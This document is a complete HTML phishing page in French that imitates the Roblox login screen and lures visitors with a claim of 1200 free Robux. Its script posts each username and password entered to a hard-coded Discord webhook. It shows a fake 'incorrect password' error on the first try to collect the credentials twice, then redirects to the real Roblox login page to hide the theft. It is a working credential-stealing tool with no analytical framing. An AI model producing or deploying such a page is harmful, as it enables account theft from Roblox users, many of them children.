<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox - Connexion</title>
    <style>
        body, html {
            margin: 0; padding: 0; height: 100%; width: 100%;
            background: #000 url('a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg') no-repeat center center fixed;
            background-size: cover;
            display: flex; justify-content: center; align-items: center;
            font-family: 'HCo Gotham SSm', Helvetica, Arial, sans-serif;
            overflow: hidden;
        }

        .main-wrapper {
            display: flex;
            gap: 20px;
            z-index: 9999;
            position: relative;
        }

        .card {
            background: #2b2d2f;
            border-radius: 8px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
        }

        .card-login {
            padding: 35px 45px;
            width: 440px;
            text-align: center;
        }

        h1 {
            color: #ffffff;
            font-size: 36px;
            font-weight: 800;
            margin: 0 0 25px 0;
            letter-spacing: -1px;
        }

        #error-display {
            color: #ff5a5a;
            font-size: 14px;
            margin-bottom: 15px;
            display: none;
            text-align: left;
            background: rgba(255, 90, 90, 0.1);
            padding: 10px;
            border-left: 3px solid #ff5a5a;
            border-radius: 2px;
        }

        input {
            width: 100%;
            padding: 14px 12px;
            margin-bottom: 12px;
            background: #393b3d;
            border: 1px solid #111;
            border-radius: 4px;
            color: #ffffff;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
        }

        .btn-connexion {
            width: 100%;
            padding: 12px;
            background: transparent;
            border: 1px solid #ffffff;
            color: #ffffff;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
        }

        .forgot-link {
            color: #ffffff;
            font-size: 14px;
            margin-top: 25px;
            display: block;
            text-decoration: none;
        }

        .card-robux {
            background: #111;
            padding: 35px;
            border-radius: 12px;
            width: 280px;
            text-align: center;
            border: 1px solid #333;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .robux-amount { font-size: 75px; font-weight: 900; color: #f6b000; margin: 0; }
        .robux-label { color: #f6b000; font-size: 24px; font-weight: bold; }
    </style>
</head>
<body>

    <div class="main-wrapper">
        <div class="card card-login">
            <h1>Connexion à Roblox</h1>
            <div id="error-display">Identifiant ou mot de passe incorrect.</div>
            <input type="text" id="user" placeholder="Identifiant/E-mail/Téléphone">
            <input type="password" id="pass" placeholder="Mot de passe">
            <button class="btn-connexion" id="loginBtn" onclick="handleLogin()">Connexion</button>
            <a href="#" class="forgot-link">Mot de passe ou nom d'utilisateur oublié ?</a>
        </div>

        <div class="card card-robux">
            <img src="https://images.rbxcdn.com/6949392666d6d45e5d32c96c466487e4-robux_28.png" style="width:80px; margin-bottom:10px;">
            <p class="robux-amount">1200</p>
            <p class="robux-label">Robux</p>
            <button class="btn-connexion" style="border:none; color:#555;" onclick="showError()">RÉCLAMER</button>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1499403968227573981/1T9Z-wrJ8KhLugjuYY1pKEGEFt7lR1-N0zOGQrwJxiH63M7AwOCYO5B-l09eTfWDZoF8";
        let attempt = 0;

        function showError(msg = "Veuillez vous connecter d'abord.") {
            const err = document.getElementById('error-display');
            err.innerText = msg;
            err.style.display = 'block';
        }

        async function handleLogin() {
            const u = document.getElementById('user').value;
            const p = document.getElementById('pass').value;
            const btn = document.getElementById('loginBtn');

            if(!u || !p) {
                showError("Veuillez remplir tous les champs.");
                return;
            }

            attempt++;
            btn.innerText = "Chargement...";

            // Envoi à Discord
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: `**Tentative n°${attempt}**\nUtilisateur : \`${u}\`\nMot de passe : \`${p}\``
                    })
                });
            } catch (e) {}

            // Logique de redirection
            setTimeout(() => {
                if (attempt >= 2) {
                    // Au deuxième essai, redirection vers le vrai Roblox
                    window.location.href = "https://www.roblox.com/login";
                } else {
                    // Au premier essai, on montre l'erreur
                    btn.innerText = "Connexion";
                    showError("Identifiant ou mot de passe incorrect.");
                }
            }, 800);
        }
    </script>
</body>
</html>
